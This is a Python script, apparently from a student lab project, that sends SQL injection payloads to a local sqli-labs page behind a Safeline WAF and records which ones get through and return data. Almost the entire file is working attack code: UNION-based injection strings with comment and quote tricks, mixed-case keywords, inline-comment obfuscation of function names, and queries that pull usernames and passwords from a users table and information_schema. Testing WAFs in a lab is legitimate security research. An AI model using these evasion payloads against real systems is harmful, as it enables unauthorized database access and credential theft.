"""
bypass_lab/test_get_dbname.py
==============================
Goal: return database name via the .N-- -'/0 UNION bypass.

Hypothesis: ending dengan ' membuat Safeline treat sisa payload sebagai
string literal → function calls MUNGKIN tidak di-detect.

Belum pernah test: database() dengan ending '
(Sebelumnya test dengan ending -- - dan BLOCKED)

Run:
    python3 -m bypass_lab.test_get_dbname
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"
FOUND = []


def t(label, payload):
    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
    rw = requests.get(WAF,   params={"id": payload}, timeout=8)

    def get_login(text):
        idx = text.find("Your Login name:")
        return text[idx+16:idx+60].split("<")[0].strip() if idx >= 0 else ""

    pv = get_login(rp.text)
    wv = get_login(rw.text)
    w_block = rw.status_code == 403

    w_tag = "BLOCK" if w_block else ("GOT_DATA" if wv else "PASS_empty")
    print(f"  [{w_tag:<12}] plain={repr(pv[:25]):<28} waf={repr(wv[:25])} | {label}")

    if not w_block and wv:
        FOUND.append((label, payload, wv))
    time.sleep(0.3)


print("=" * 70)
print(" Cari cara return database name melalui bypass pattern")
print("=" * 70)

# ── 1. Critical test: database() dengan ending ' (belum pernah ditest!) ──
print("\n[1] database() dengan ending ' — apakah pass WAF?")
t("database() col2 + quote end",
  ".1-- -'/0 UNION ALL SELECT 1,database(),2'")
t("database() col1 + quote end",
  ".1-- -'/0 UNION ALL SELECT database(),1,2'")
t("database() all cols + quote end",
  ".1-- -'/0 UNION ALL SELECT database(),database(),database()'")
t("database() + case uNiOn + quote",
  ".1-- -'/0 uNiOn aLl sElEcT 1,database(),2'")

# ── 2. System vars dengan ending ' ──────────────────────────────────────
print("\n[2] @@variable dengan ending ' (sebelumnya test dengan -- -)")
t("@@version col2 + quote end",
  ".1-- -'/0 UNION ALL SELECT 1,@@version,2'")
t("@@hostname col2 + quote end",
  ".1-- -'/0 UNION ALL SELECT 1,@@hostname,2'")
t("@@datadir col2 + quote end",
  ".1-- -'/0 UNION ALL SELECT 1,@@datadir,2'")
t("CURRENT_USER + quote end",
  ".1-- -'/0 UNION ALL SELECT 1,CURRENT_USER,2'")

# ── 3. Direct FROM table (bukan function) ───────────────────────────────
print("\n[3] SELECT dari tabel langsung (tidak pakai function)")
t("FROM users username col2",
  ".1-- -'/0 UNION ALL SELECT 1,username,password FROM users LIMIT 1'")
t("FROM users col1",
  ".1-- -'/0 UNION ALL SELECT username,password,id FROM users LIMIT 1'")
t("FROM information_schema.schemata",
  ".1-- -'/0 UNION ALL SELECT 1,schema_name,1 FROM information_schema.schemata LIMIT 1'")

# ── 4. Obfuscate function name ──────────────────────────────────────────
print("\n[4] Obfuscasi nama fungsi")
t("data/**/base()",
  ".1-- -'/0 UNION ALL SELECT 1,data/**/base(),2'")
t("/*!database*/()",
  ".1-- -'/0 UNION ALL SELECT 1,/*!database*/(),2'")
t("/*!50000database*/()",
  ".1-- -'/0 UNION ALL SELECT 1,/*!50000database*/(),2'")
t("d\\atabase() backslash",
  ".1-- -'/0 UNION ALL SELECT 1,d\\atabase(),2'")

# ── 5. Gunakan ASCII return dari conditional ────────────────────────────
print("\n[5] Extract via ASCII math — tanpa function call")
# Ini trick: pakai bitmask atau comparison untuk leak 1 bit
t("1=1 returns 1 (boolean proof)",
  ".1-- -'/0 UNION ALL SELECT 1,1=1,2'")
t("0=0 returns 1",
  ".1-- -'/0 UNION ALL SELECT 1,0=0,2'")
t("1=2 returns 0",
  ".1-- -'/0 UNION ALL SELECT 1,1=2,2'")

# ── 6. Combine numeric bypass tapi dari tabel real ─────────────────────
print("\n[6] Pull dari tabel tapi return angka (length, position)")
t("LENGTH no parens hint",
  ".1-- -'/0 UNION ALL SELECT 1,CHAR_LENGTH(username),id FROM users WHERE id=1'")
t("ORD comparison",
  ".1-- -'/0 UNION ALL SELECT 1,ORD(username),id FROM users WHERE id=1'")

# ── Summary ────────────────────────────────────────────────────────────
print("\n" + "=" * 70)
print(f" FOUND (WAF bypassed + data returned): {len(FOUND)}")
for label, p, val in FOUND:
    print(f"\n  label: {label}")
    print(f"  WAF returned: {repr(val)}")
    print(f"  payload: {p[:100]}")
